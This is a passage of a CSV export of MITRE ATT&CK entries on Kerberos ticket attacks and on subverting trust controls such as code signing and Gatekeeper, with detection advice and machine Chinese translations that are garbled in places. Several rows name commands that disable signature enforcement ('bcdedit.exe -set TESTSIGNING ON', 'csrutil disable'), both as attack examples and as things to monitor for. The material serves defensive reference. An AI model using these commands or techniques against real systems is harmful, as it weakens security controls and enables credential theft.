Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",https://attack.mitre.org/techniques/T1558/004,24 August 2020,07 June 2021,1.0,Credential Access,"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)",Windows,Active Directory: Active Directory Credential Request,True,T1558,,"Dan Nutting, @KerberToast; Jacques Pluviose, @Jacqueswildy_IT; James Dunn, @jamdunnDFW, EY; Swapnil Kumbhar; Yossi Nisani, Cymptom",User,,Valid domain account,,,,",(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019),(Citation: Microsoft Preauthentication Jul 2012),(Citation: AdSecurity Cracking Kerberos Dec 2015)",窃取或伪造 Kerberos 票证：AS-REP Roasting,攻击者可能会通过 [密码破解](https://attack.mitre.org/techniques/T1110/002) Kerberos 消息泄露已禁用 Kerberos 预身份验证的帐户的凭据。（引用：Harmj0y Roasting AS-REPs Jan 2017）预身份验证提供保护防止离线[密码破解](https://attack.mitre.org/techniques/T1110/002)。启用后，请求访问资源的用户通过发送带有时间戳的身份验证服务器请求 (AS-REQ) 消息来启动与域控制器 (DC) 的通信，该时间戳使用其密码的哈希值加密。当且仅当 DC 能够使用用户密码的哈希成功解密时间戳时，它才会向用户发送包含 Ticket Granting Ticket (TGT) 的身份验证服务器响应 (AS-REP) 消息。 AS-REP 消息的一部分使用用户的密码进行签名。（引用：Microsoft Kerberos Preauth 2014）对于每个没有预认证的帐户，攻击者可以发送没有加密时间戳的 AS-REQ 消息并接收带有可能使用不安全算法（例如 RC4）加密的 TGT 数据。恢复的加密数据可能容易受到类似于 [Kerberoasting](https://attack.mitre.org/techniques/T1558) 的离线 [Password Cracking](https://attack.mitre.org/techniques/T1110/002) 攻击/003) 并公开明文凭据。 （引用：Harmj0y Roasting AS-REPs Jan 2017）（引用：Stealthbits Cracking AS-REP Roasting Jun 2019）注册到域的帐户，无论是否具有特殊权限，都可以被滥用以列出所有已禁用预身份验证的域帐户，方法是使用带有 LDAP 过滤器的 Windows 工具，例如 [PowerShell](https://attack.mitre.org/techniques/T1059/001)。或者，攻击者可以为每个用户发送一个 AS-REQ 消息。如果 DC 响应没有错误，则该帐户不需要预身份验证，并且 AS-REP 消息将已包含加密数据。 （引用：Harmj0y Roasting AS-REPs Jan 2017）（引用：Stealthbits Cracking AS-REP Roasting Jun 2019）破解的哈希可能会启用[持久性]（https://attack.mitre.org/tactics/TA0003），[权限升级] (https://attack.mitre.org/tactics/TA0004) 和 [横向移动](https://attack.mitre.org/tactics/TA0008) 通过访问 [有效帐户](https://attack. mitre.org/techniques/T1078）。（引文：SANS Attacking Kerberos 2014 年 11 月）
T1558.001,Steal or Forge Kerberos Tickets: Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) 

Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)

The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",https://attack.mitre.org/techniques/T1558/001,11 February 2020,05 November 2020,1.1,Credential Access,"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)

Monitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)

Monitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. 
",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Metadata",True,T1558,,"Itamar Mizrahi, Cymptom",User,,,,,,"(Citation: GitHub Mimikatz kerberos Module),(Citation: NCC Group APT15 Alive and Strong),(Citation: Github PowerShell Empire),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: STIG krbtgt reset)",窃取或伪造 Kerberos 票证：Golden Ticket,拥有 KRBTGT 帐户密码哈希的攻击者可以伪造 Kerberos 票证授予票证 (TGT)，也称为黄金票证。（引用：AdSecurity Kerberos GT 2015 年 8 月）黄金票证使攻击者能够为 Active Directory 中的任何帐户生成身份验证材料。 （引用：CERT-EU Golden Ticket Protection）使用黄金票，攻击者可以请求票证授予服务 (TGS) 票证，从而可以访问特定资源。金票要求攻击者与密钥分发中心 (KDC) 交互以获得 TGS。（引文：ADSecurity Detecting Forged Tickets）KDC 服务全部运行在属于 Active Directory 域的域控制器上。 KRBTGT 是 Kerberos 密钥分发中心 (KDC) 服务帐户，负责对所有 Kerberos 票据进行加密和签名。（引用：ADSecurity Kerberos 和 KRBTGT）可以使用 [OS Credential Dumping]（https://attack）获取 KRBTGT 密码哈希.mitre.org/techniques/T1003）和对域控制器的特权访问。
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",https://attack.mitre.org/techniques/T1558/003,11 February 2020,08 March 2022,1.2,Credential Access,"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)",Windows,Active Directory: Active Directory Credential Request,True,T1558,,Praetorian,,,Valid domain account or the ability to sniff traffic within a domain,CAPEC-509,,,"(Citation: Impacket Tools),(Citation: Harmj0y Kerberoast Nov 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Github PowerShell Empire),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: PowerSploit Invoke Kerberoast),(Citation: AdSecurity Cracking Kerberos Dec 2015)",窃取或伪造 Kerberos 票证：Kerberoasting,攻击者可能会滥用有效的 Kerberos 票证授予票证 (TGT) 或嗅探网络流量以获取可能易受 [Brute Force] 攻击的票证授予服务 (TGS) 票证(https://attack.mitre.org/techniques/ T1110)。（引用：Empire InvokeKerberoast 2016 年 10 月）（引用：AdSecurity Cracking Kerberos Dec 2015）服务主体名称 (SPN) 用于唯一标识 Windows 服务的每个实例。要启用身份验证，Kerberos 要求 SPN 与至少一个服务登录帐户（专门负责运行服务的帐户（引文：Microsoft Detecting Kerberoasting Feb 2018））相关联。（引文：Microsoft SPN）（引文：Microsoft SetSPN）（引用：SANS Attacking Kerberos Nov 2014)（引用：Harmj0y Kerberoast Nov 2016）拥有有效 Kerberos 票证授予票证 (TGT) 的攻击者可以从域控制器请求任何 SPN 的一个或多个 Kerberos 票证授予服务 (TGS) 服务票证(DC).（引文：Empire InvokeKerberoast 2016 年 10 月）（引文：AdSecurity Cracking Kerberos Dec 2015）这些票证的一部分可以使用 RC4 算法加密，这意味着与SPN 用作私钥，因此容易受到可能暴露明文凭据的离线 [Brute Force](https://attack.mitre.org/techniques/T1110) 攻击。（引用：AdSecurity Cracking Kerbero s Dec 2015)（引用：Empire InvokeKerberoast 2016 年 10 月）（引用：Harmj0y Kerberoast 2016 年 11 月）可以使用从网络流量中捕获的服务票证执行相同的行为。（引用：AdSecurity Cracking Kerberos Dec 2015）破解哈希可能会启用 [持久性] (https://attack.mitre.org/tactics/TA0003)、[权限升级](https://attack.mitre.org/tactics/TA0004)、[横向移动](https://attack.mitre. org/tactics/TA0008）通过访问[有效帐户]（https://attack.mitre.org/techniques/T1078）。（引文：SANS Attacking Kerberos Nov 2014）
T1558.002,Steal or Forge Kerberos Tickets: Silver Ticket,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)

Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",https://attack.mitre.org/techniques/T1558/002,11 February 2020,25 March 2020,1.0,Credential Access,"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) 

Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",Windows,Logon Session: Logon Session Metadata,True,T1558,,,User,,,,,,"(Citation: GitHub Mimikatz kerberos Module),(Citation: Github PowerShell Empire),(Citation: AADInternals Documentation),(Citation: AdSecurity Cracking Kerberos Dec 2015)",窃取或伪造 Kerberos 票证：银票,拥有目标服务帐户（例如 SharePoint、MSSQL）的密码哈希的攻击者可能会伪造 Kerberos 票证授予服务 (TGS) 票证，也称为银票。 Kerberos TGS 票证也称为服务票证。（引用：ADSecurity 银票证）银票证的范围比金票证更受限制，因为它们仅允许攻击者访问特定资源（例如 MSSQL）和托管该资源的系统;然而，与金票不同，能够伪造银票的对手能够在不与密钥分发中心 (KDC) 交互的情况下创建 TGS 票，这可能会使检测更加困难。（引用：ADSecurity 检测伪造票）目标服务的密码哈希可以使用 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) 或 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) 获得。
T1553,Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ",https://attack.mitre.org/techniques/T1553,05 February 2020,05 May 2022,1.1,Defense Evasion,"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)

Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure ""Hide Microsoft Entries"" and ""Hide Windows Entries"" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) 

Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. ","Linux, Windows, macOS","Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",False,,"Anti-virus, Application Control, Autoruns Analysis, Digital Certificate Validation, User Mode Signature Validation, Windows User Account Control",,,,,,,,"(Citation: Novetta-Axiom),(Citation: SpectorOps Code Signing Dec 2017),(Citation: Wikipedia HPKP)",破坏信任控制,攻击者可能会破坏安全控制，这些控制会警告用户不受信任的活动或阻止执行不受信任的程序。操作系统和安全产品可能包含将程序或网站识别为具有某种程度的信任的机制。此类功能的示例包括允许运行的程序，因为它由有效的代码签名证书签名，程序提示用户警告，因为它具有从 Internet 下载的属性集，或者指示您即将连接到不受信任的站点。对手可能会试图破坏这些信任机制。对手使用的方法将取决于他们试图颠覆的具体机制。攻击者可以进行 [文件和目录权限修改](https://attack.mitre.org/techniques/T1222) 或 [修改注册表](https://attack.mitre.org/techniques/T1112) 以支持颠覆这些控制。（引文：SpectorOps Subverting Trust 2017 年 9 月）攻击者还可能创建或窃取代码签名证书以获得对目标系统的信任。（引文：Securelist 数字证书）（引文：赛门铁克数字证书）
T1553.002,Subvert Trust Controls: Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",https://attack.mitre.org/techniques/T1553/002,05 February 2020,22 September 2022,1.1,Defense Evasion,Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.,"Windows, macOS",File: File Metadata,True,T1553,Windows User Account Control,,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Microsoft GALLIUM December 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Unit42 Clop April 2021),(Citation: ESET Ebury Feb 2014),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec Nerex May 2012),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Symantec Tick Apr 2016),(Citation: Unit 42 BackConfig May 2020),(Citation: ATT QakBot April 2021),(Citation: Lazarus APT January 2022),(Citation: ESET RTM Feb 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: FireEye APT40 March 2019),(Citation: ESET PipeMon May 2020),(Citation: Group IB APT 41 June 2021),(Citation: Kaspersky Turla),(Citation: JPCERT ChChes Feb 2017),(Citation: ClearSky OilRig Jan 2017),(Citation: Wired Lockergoga 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: FireEye APT41 Aug 2019),(Citation: Kaspersky Darkhotel),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye Periscope March 2018),(Citation: ESET Lazarus Jun 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: FireEye Operation Molerats),(Citation: Securelist Darkhotel Aug 2015),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye FIN7 Oct 2019),(Citation: Symantec Suckfly March 2016),(Citation: Cybereason Bazar July 2020),(Citation: Volexity Patchwork June 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: FireEye CARBANAK June 2017),(Citation: Group IB Silence Aug 2019),(Citation: Securelist APT10 March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: ESET Hermetic Wiper February 2022),(Citation: McAfee Honeybee),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Janicab),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Qualys Hermetic Wiper March 2022),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: CheckPoint Bandook Nov 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Symantec Ukraine Wipers February 2022),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Cybereason TA505 April 2019),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Palo Alto menuPass Feb 2017),(Citation: ESET Gazer Aug 2017),(Citation: Kaspersky Winnti April 2013),(Citation: DFIR Conti Bazar Nov 2021),",破坏信任控制：代码签名,攻击者可能会创建、获取或窃取代码签名材料来签署他们的恶意软件或工具。代码签名为开发人员的二进制文件提供了一定程度的真实性，并保证二进制文件未被篡改。 （引用：维基百科代码签名）在操作期间使用的证书可能被对手创建、获取或窃取。 （引用：Securelist 数字证书）（引用：赛门铁克数字证书）与 [无效代码签名](https://attack.mitre.org/techniques/T1036/001) 不同，此活动将生成有效签名。首次运行时验证软件的代码签名可用于现代 Windows 和 macOS 系统。由于平台的分散性，它不在 Linux 上使用。 （引用：维基百科代码签名）（引用：EclecticLightChecksonEXECodeSigning）代码签名证书可用于绕过需要签名代码在系统上执行的安全策略。
T1553.006,Subvert Trust Controls: Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. 

Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)

Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)

To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",https://attack.mitre.org/techniques/T1553/006,23 April 2021,05 May 2022,1.0,Defense Evasion,"Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\Software\Policies\Microsoft\Windows NT\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.","Windows, macOS","Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1553,"Application Control, Digital Certificate Validation, User Mode Signature Validation","Abel Morales, Exabeam",,,,,,,"(Citation: Trend Micro Iron Tiger April 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: GitHub Turla Driver Loader),(Citation: Unit42 AcidBox June 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Microsoft TESTSIGNING Feb 2021)",破坏信任控制：代码签名策略修改,攻击者可能会修改代码签名策略以启用未签名或自签名代码的执行。代码签名为开发人员提供的程序提供了一定程度的真实性，并保证程序没有被篡改。安全控制可以包括强制机制，以确保只有有效的签名代码可以在操作系统上运行。其中一些安全控件可能默认启用，例如 Windows 上的驱动程序签名强制 (DSE) 或 macOS 上的系统完整性保护 (SIP)。（引用：Microsoft DSE 2017 年 6 月）（引用：Apple 禁用 SIP）其他此类控制可能默认情况下禁用，但可通过应用程序控件进行配置，例如仅允许签名的动态链接库 (DLL) 在系统上执行。由于开发人员在开发和测试应用程序期间修改默认签名强制策略可能很有用，因此可以通过提升权限禁用这些功能。（引用：Microsoft Unsigned Driver Apr 2017）（引用：Apple Disable SIP）攻击者可能以多种方式修改代码签名策略，包括通过使用命令行或 GUI 实用程序、[修改注册表](https://attack.mitre.org/techniques/T1112)、以调试/恢复模式重新启动计算机，或通过更改内核内存中变量的值。（引用：Microsoft TESTSIGNING Feb 2021）（引用：Apple Disable SIP）（引用：FireEye HIKIT Rootkit Part 2）（引用：GitHub Turla Driver Loader）可以修改的命令示例系统的代码签名策略包括 Windows 上的 <code>bcdedit.exe -set TESTSIGNING ON</code> 和 macOS 上的 <code>csrutil disable</code>。（引用：Microsoft TESTSIGNING Feb 2021）（引用：Apple Disable SIP) 取决于工具化，签名策略的成功修改可能需要重新启动受感染的系统。此外，某些实现可能会为用户引入可见的伪影（例如：屏幕角落的水印表明系统处于测试模式）。攻击者可能会尝试删除此类工件。（引用：F-Secure BlackEnergy 2014）为了访问内核内存以修改与签名检查相关的变量，例如修改 <code>g_CiOptions</code> 以禁用驱动程序签名强制，攻击者可以使用已签名但易受攻击的驱动程序进行 [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)。（引用：Unit42 AcidBox June 2020）（引用：GitHub Turla Driver Loader）
T1553.001,Subvert Trust Controls: Gatekeeper Bypass,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )

Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:

1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)

2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.

3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.

4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.

Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)

Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1553/001,05 February 2020,21 October 2022,1.2,Defense Evasion,"The removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the <code>com.apple.quarantine</code> flag when performing updates. 

Review <code>false</code> values under the <code>LSFileQuarantineEnabled</code> entry in an application's <code>Info.plist</code> file (required by every application). <code>false</code> under <code>LSFileQuarantineEnabled</code> indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified <code>LSFileQuarantineEnabled</code> entry will default to not setting the quarantine flag. 

QuarantineEvents is a SQLite database containing a list of all files assigned the <code>com.apple.quarantine</code> attribute, located at <code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.(Citation: TheEclecticLightCompany Quarantine and the flag)",macOS,"Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Creation",True,T1553,"Anti-virus, Application Control","Brandon Dalton @PartyD0lphin; Swasti Bhushan Deb, IBM India Pvt. Ltd.",,,,,,,"(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: CoinTicker 2019),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: Carbon Black Shlayer Feb 2019),(Citation: ESET DazzleSpy Jan 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: Shlayer jamf gatekeeper bypass 2021),",破坏信任控制：Gatekeeper Bypass,攻击者可能会修改文件属性并破坏 Gatekeeper 功能以逃避用户提示并执行不受信任的程序。 Gatekeeper 是一组充当 Apple 安全模型层的技术，可确保仅在主机上执行受信任的应用程序。 Gatekeeper 建立在 Snow Leopard（10.6，2009）中的 File Quarantine 之上，并且已经发展到包括代码签名、安全策略合规性、公证等。 Gatekeeper 还对待第一次运行的应用程序与重新打开的应用程序不同。（引用：TheEclecticLightCompany 隔离区和标志）（引用：TheEclecticLightCompany 苹果公证）基于选择加入系统，当下载文件时，扩展属性 (xattr) 称为` com.apple.quarantine`（也称为隔离标志）可以由执行下载的应用程序在文件上设置。启动服务以挂起状态打开应用程序。对于设置了隔离标志的首次运行应用程序，Gatekeeper 执行以下功能： 1. 检查扩展属性 - Gatekeeper 检查隔离标志，然后向用户提供允许或拒绝执行的警报提示。（引用：OceanLotus for OS X )（引用：20 个 macOS 常用工具和技术） 2. 检查系统策略 - Gatekeeper 检查系统安全策略，允许执行从 App Store 或 App Store 下载的应用程序和已识别的开发人员。 3. 代码签名——Gatekeeper 检查来自 Apple Developer ID 的有效代码签名。 4. 公证 - 使用 `api.apple-cloudkit.com` API，Gatekeeper 与 Apple 服务器联系以验证或拉下公证票并确保票不会被撤销。用户可以覆盖公证，这将导致执行“未经授权的应用程序”的提示，并修改安全策略。攻击者可以通过逻辑错误（例如[防御规避漏洞利用](https://attack.mitre.org/techniques/T1211)）、未经检查的文件类型和外部库来破坏 Gatekeeper 检查中的一个或多个安全控制。例如，在 macOS 13 Ventura 之前，代码签名和公证检查仅在首次启动时进行，允许攻击者将恶意可执行文件写入先前打开的应用程序以绕过 Gatekeeper 安全检查。（引文：theevilbit gatekeeper bypass 2021）（引文：应用程序包操作 